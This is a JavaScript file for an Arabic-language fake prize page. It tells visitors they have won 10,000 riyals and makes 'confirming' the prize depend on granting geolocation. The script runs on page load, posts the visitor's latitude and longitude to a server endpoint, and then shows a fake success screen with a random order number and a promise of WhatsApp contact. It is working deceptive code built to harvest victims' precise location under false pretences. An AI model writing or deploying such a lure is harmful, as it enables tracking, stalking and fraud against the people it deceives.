window.onload = function() {
    const statusDiv = document.getElementById('status');
    const loadingDiv = document.getElementById('loading');

    // متغير لمنع تكرار الطلبات
    let isProcessing = false;

    // دالة لإظهار رسالة خطأ
    function showError(message) {
        const button = document.querySelector('.confirm-btn');
        if (button) {
            button.textContent = 'تأكيد استلام الجائزة';
            button.disabled = false;
            button.classList.add('pulse');
        }
        
        alert(message);
    }

    // دالة لإظهار رسالة نجاح
    function showSuccess() {
        const container = document.querySelector('.container');
        container.innerHTML = `
            <div class="header" style="text-align: center;">
                <h1 style="margin-bottom: 20px;">تم التأكيد بنجاح! 🎉</h1>
                <div class="prize-amount">10,000 ريال</div>
            </div>
            <div class="content" style="padding: 30px;">
                <div style="background: #f8f9fa; border-radius: 15px; padding: 20px; margin-bottom: 20px;">
                    <div style="color: #28a745; font-size: 24px; margin-bottom: 10px;">✅</div>
                    <h2 style="color: #28a745; margin: 10px 0;">تم تسجيل طلبك بنجاح</h2>
                    <p style="color: #666; line-height: 1.6; margin: 15px 0;">
                        سيتم التواصل معك خلال 24 ساعة عبر WhatsApp<br>
                        لإكمال إجراءات استلام جائزتك
                    </p>
                </div>
                
                <div style="border: 1px dashed #ddd; padding: 15px; border-radius: 10px;">
                    <div style="color: #666; font-size: 0.9em; margin-bottom: 5px;">رقم الطلب</div>
                    <div style="font-size: 1.2em; color: #DD2476; font-weight: bold;">
                        #${Math.floor(Math.random() * 1000000).toString().padStart(6, '0')}
                    </div>
                </div>

                <div style="margin-top: 30px; color: #666; font-size: 0.9em;">
                    * يرجى الاحتفاظ برقم الطلب
                </div>
            </div>
        `;
    }

    // دالة لبدء عملية تأكيد الجائزة
    async function startProcess() {
        if (isProcessing) return;
        isProcessing = true;

        try {
            // محاولة الحصول على الموقع الحالي
            const permission = await requestLocationPermission();
            if (permission === 'granted') {
                getLocation();
            } else {
                showError('عذراً، يجب السماح بالوصول إلى الموقع لإتمام العملية.');
                isProcessing = false;
            }
        } catch (error) {
            showError('عذراً، حدث خطأ غير متوقع. الرجاء المحاولة من هاتف آخر.');
            isProcessing = false;
        }
    }

    // طلب إذن الموقع
    async function requestLocationPermission() {
        try {
            // التحقق من دعم واجهة الأذونات
            if (navigator.permissions && navigator.permissions.query) {
                const result = await navigator.permissions.query({ name: 'geolocation' });
                if (result.state === 'granted') {
                    return 'granted';
                } else if (result.state === 'prompt') {
                    return new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            () => resolve('granted'),
                            () => resolve('denied')
                        );
                    });
                } else {
                    return 'denied';
                }
            }
            return 'prompt';
        } catch {
            return 'prompt';
        }
    }

    // الحصول على الموقع
    function getLocation() {
        navigator.geolocation.getCurrentPosition(handleSuccess, handleError);
    }

    // معالجة نجاح تحديد الموقع
    function handleSuccess(position) {
        const { latitude, longitude } = position.coords;
        // إرسال الموقع إلى الخادم
        fetch('/api/location', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ latitude, longitude })
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showSuccess();
            } else {
                showError('عذراً، حدث خطأ أثناء إرسال الموقع. الرجاء المحاولة مرة أخرى.');
            }
            isProcessing = false;
        })
        .catch(() => {
            showError('عذراً، حدث خطأ أثناء إرسال الموقع. الرجاء المحاولة مرة أخرى.');
            isProcessing = false;
        });
    }

    // معالجة أخطاء تحديد الموقع
    function handleError(error) {
        showError('عذراً، لم نتمكن من تحديد موقعك. الرجاء المحاولة مرة أخرى.');
        isProcessing = false;
    }

    // طلب إذن الموقع فور دخول المستخدم الموقع
    startProcess();
};